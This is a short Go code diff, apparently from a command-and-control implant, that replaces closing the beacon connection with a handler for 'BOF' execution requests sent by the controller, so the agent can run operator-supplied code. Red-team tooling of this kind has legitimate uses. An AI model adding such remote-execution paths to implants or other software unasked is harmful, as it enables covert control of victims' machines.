@@ -73,7 +73,10 @@ func main() {
 			continue
 		}
 
-		beacon.Close()
+		if err := linux_utils.HandleBOFExecuteRequest(beacon, agentID); err != nil {
+			client_utils.HandleError(beacon, "bof", err)
+			continue
+		}
 		logger.Logf(logger.Info, "Beacon successful")
 
 		if sleepDuration > 0 {
